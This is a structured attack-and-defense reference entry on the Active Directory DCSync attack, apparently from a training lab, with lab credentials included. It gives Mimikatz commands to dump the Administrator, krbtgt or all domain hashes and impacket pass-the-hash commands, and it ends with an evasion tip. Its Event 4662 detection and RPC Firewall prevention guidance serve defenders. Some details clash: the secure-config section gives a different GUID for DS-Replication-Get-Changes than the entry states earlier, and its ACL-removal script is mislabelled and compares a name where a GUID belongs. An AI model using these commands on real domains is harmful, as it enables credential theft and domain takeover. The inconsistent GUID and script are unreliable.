name: DCSync Attack — Attack, Detection & Defense
description: DCSync impersonates a Domain Controller to request password hash replication from a real DC. Requires 'Replicating Directory Changes' and 'Replicating Directory Changes All' rights. Detection: Event 4662 with specific AD replication GUIDs originating from a non-DC account. Prevention: RPC Firewall to restrict replication to DC-only sources.
notes:
Required rights:
  → Replicating Directory Changes   (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
  → Replicating Directory Changes All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)

Lab user: rocky / Slavi123 (has both rights in eagle.local)

=== ATTACK ===
# Step 1: Start shell as privileged user (from bob's session)
runas /user:<DOMAIN>\<USERNAME> cmd.exe
  → Enter password when prompted

# Step 2: DCSync with Mimikatz
cd C:\Mimikatz
mimikatz.exe

# Dump specific user's hash
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:Administrator

# Dump ALL hashes in the domain (noisy!)
mimikatz # lsadump::dcsync /domain:<DOMAIN> /all

# Dump krbtgt hash (for Golden Ticket)
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt

Output fields:
  Hash NTLM: <32-char hex>   ← primary hash for PtH attacks
  aes256_hmac (4096): <64-char hex>   ← for Kerberos overpass-the-hash
  des_cbc_md5: <hex>

# Pass-the-hash with obtained NTLM hash (from Kali)
impacket-wmiexec <DOMAIN>/Administrator@<DC_IP> -hashes :<NTLM_HASH>
impacket-psexec <DOMAIN>/Administrator@<DC_IP> -hashes :<NTLM_HASH>

=== DETECTION ===
Event 4662: 'An operation was performed on an object'
  → Generated for each DC replication
  → ALERT when: initiator is NOT a Domain Controller computer account (account ending in $)
  → Filter for properties containing:
    1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (Replicating Directory Changes)
    1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (Replicating Directory Changes All)
  → Whitelist legitimate: Azure AD Connect account, DC computer accounts

False positive exclusions:
  → Azure AD Connect constantly replicates to Azure AD
  → DC-to-DC replication (DC1$ → DC2$, etc.) is normal

=== PREVENTION ===
  → RPC Firewall (third-party): https://github.com/zeronetworks/rpcfirewall
  → Block replication from non-DC sources at the RPC layer

examples.label: DCSync — dump krbtgt hash (Golden Ticket prep)

recommended.note: After DCSync to get krbtgt hash, forge Golden Tickets.
NTLM relay via PrinterBug can also trigger DCSync without Event 4662.

defense.why_it_works: DCSync abuses the AD replication protocol: an account holding 'Replicating Directory Changes' and 'Replicating Directory Changes All' can impersonate a Domain Controller and ask a real DC to replicate password hashes — no code runs on the DC.
defense.prerequisites: An account (or delegated rights) granted both replication rights on the domain object (GUIDs 1131f6aa-… and 1131f6ad-…).
defense.impact: Password hashes for any or all domain accounts — including krbtgt (enabling Golden Ticket) and Administrator (enabling pass-the-hash to full domain compromise).
defense.detection: Event 4662 ('An operation was performed on an object'), generated for each replication. Alert when the initiator is NOT a Domain Controller computer account (name ending in $) and the properties contain the two replication GUIDs (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 and 1131f6ad-…).
defense.artifacts: 4662 events referencing the replication GUIDs from a non-DC principal; Mimikatz lsadump::dcsync execution on the attacker host. Legitimate replication (DC-to-DC, Azure AD Connect) must be whitelisted to cut false positives.
defense.prevention: Deploy an RPC Firewall (e.g., zeronetworks/rpcfirewall) to block replication from non-DC sources at the RPC layer; tightly restrict who holds replication rights and audit the domain object DACL for them.
defense.misconfiguration: User or computer accounts have been granted AD replication rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All) that are not needed for their role. These rights are required by Domain Controllers to synchronize, but if granted to a regular account (via ACL on the domain object, or inherited through group membership), the account can call DRSGetNCChanges() and pull NTLM hashes for any account — including krbtgt and Domain Admins.
defense.vulnerable_config:
# Checking who has dangerous replication rights on the domain object:
# (via BloodHound 'DCSync' edge, or directly):
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=local' -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match 'DS-Replication-Get-Changes'} |
  Select-Object IdentityReference, ActiveDirectoryRights

# Dangerous output:
# IdentityReference            ActiveDirectoryRights
# CORP\svc_monitoring          DS-Replication-Get-Changes-All
# CORP\john.doe                DS-Replication-Get-Changes

# Legitimate holders: CORP\Domain Controllers, CORP\Enterprise Controllers, CORP\ENTERPRISE DOMAIN CONTROLLERS
defense.secure_config:
# Remove DCSync rights from non-DC accounts:
# Using PowerView:
$acl = Get-Acl 'AD:\DC=corp,DC=local'
$ace = $acl.Access | Where-Object {
    $_.IdentityReference -match 'svc_monitoring' -and
    $_.ObjectType -eq 'DS-Replication-Get-Changes-All'
}
$acl.RemoveAccessRule($ace)
Set-Acl 'AD:\DC=corp,DC=local' $acl

# Alert on all DCSync-capable accounts:
# Microsoft Defender for Identity detects DCSync automatically (alert: 'DCSync attack')
# SIEM: Watch for 4662 events with replication rights GUIDs:
# {19195a5b-6da0-11d0-afd3-00c04fd930c9} = DS-Replication-Get-Changes
# {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} = DS-Replication-Get-Changes-All
defense.evasion: Run the escalation in-memory where possible, restore any modified config/ACL, and remove dropped payloads after obtaining the higher context.
